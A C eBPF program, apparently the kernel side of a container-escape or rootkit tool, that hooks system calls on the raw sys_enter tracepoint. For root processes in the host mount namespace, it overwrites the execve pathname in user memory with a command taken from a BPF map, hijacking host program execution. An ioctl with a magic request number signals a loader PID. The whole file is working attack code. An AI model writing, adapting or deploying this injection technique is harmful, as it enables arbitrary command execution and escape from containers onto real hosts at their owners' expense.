//go:build ignore
#include "vmlinux.h"
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include "common.h"
#include "execve.h"
#include "ioctl.h"

#define MAX_PATH_LEN 128

char LICENSE[] SEC("license") = "GPL";

struct event {
    u32 pid;
    char pathname[MAX_PATH_LEN];
    u32 len_pathname;
    bool injected;
    bool loader;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 24);
    __type(value, struct event);
} events SEC(".maps");

#define MAX_COMMAND_LEN 128
#define MAX_COMMAND_MASK (MAX_COMMAND_LEN - 1)

struct config {
    char command[MAX_COMMAND_LEN];
    __u32 len_command;
    __u32 caller_id;
};

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, int);
    __type(value, struct config);
} config_map SEC(".maps");

// returns 0 if really handled
static __inline int handle_enter_execve(struct bpf_raw_tracepoint_args *ctx) {
    bpf_printk("enter execve");
    // 1. init communication struct with user space
    struct event *e;
    e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) {
        return -1;
    }
    // 2. parse args
    struct execve_args args = {};
    if (parse_execve_args(ctx, &args) != 0) {
        bpf_ringbuf_discard(e, 0);
        return -1;
    }
    e->len_pathname = bpf_probe_read_user_str(e->pathname, MAX_PATH_LEN, args.pathname);
    if (e->len_pathname < 0){
        bpf_ringbuf_discard(e, 0);
        return -1;
    }
    e->pid = bpf_get_current_pid_tgid() >> 32;
    // 3. dynamic read command from user space
    int key = 0;
    struct config *cfg;
    cfg = bpf_map_lookup_elem(&config_map, &key);
    if (!cfg) {
        bpf_ringbuf_discard(e, 0);
        return -1;
    }
    // 4. handle relative
    __u32 len = cfg->len_command & MAX_COMMAND_MASK;
    if (len == 0) {
        bpf_ringbuf_discard(e, 0);
        return -1;
    }

    // 5. overwrite pathname
    // This may fail with errno 14, which means "Bad address"
    // But it still works, because execve will be called frequently
    long ret = bpf_probe_write_user((void *)args.pathname, cfg->command, len);
    if (ret != 0) {
        bpf_printk("bpf_probe_write_user failed: %d\n", ret);
        e->injected = false;
        bpf_ringbuf_submit(e, 0);
        return 0;
    }
    // 6. send event to user space
    e->injected = true;
    bpf_ringbuf_submit(e, 0);
    return 0;
}

static __inline int handle_enter_ioctl(struct bpf_raw_tracepoint_args *ctx) {
    // 1. dynamic read from user space
    int key = 0;
    struct config *cfg;
    cfg = bpf_map_lookup_elem(&config_map, &key);
    if (!cfg) {
        return -1;
    }
    if (cfg->len_command > 0) {
        return 0;
    }
    // 2. parse args from syscall
    struct ioctl_args args = {};
    if (parse_ioctl_args(ctx, &args) != 0) {
        return -1;
    }
    // 3. compare call_id
    if (cfg->caller_id != (u32)args.request) {
        return 0;
    }
    // 4. send host pid to user space
    struct event *e;
    e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) {
        return -1;
    }
    e->loader = true;
    e->pid = bpf_get_current_pid_tgid() >> 32;
    bpf_ringbuf_submit(e, 0);
    return 0;
}

SEC("raw_tracepoint/sys_enter")
int raw_tracepoint(struct bpf_raw_tracepoint_args *ctx) {
    // filter syscall
    struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
    unsigned long syscall_id = ctx->args[1];
    switch (syscall_id) {
    // TODO: use __NR_execve instead of a magic number
    case 59:
        // filter uid==0
        if (!is_root()) {
            return 0;
        }
        // filter mnt_ns==[init]
        if (!is_host()) {
            return 0;
        }
        handle_enter_execve(ctx);
        break;
    case 16: // ioctl
        handle_enter_ioctl(ctx);
        break;
    case 322: // execveat
        bpf_printk("syscall_id=%d\n", syscall_id);
        break;
    default:
        return 0;
    }
    return 0;
}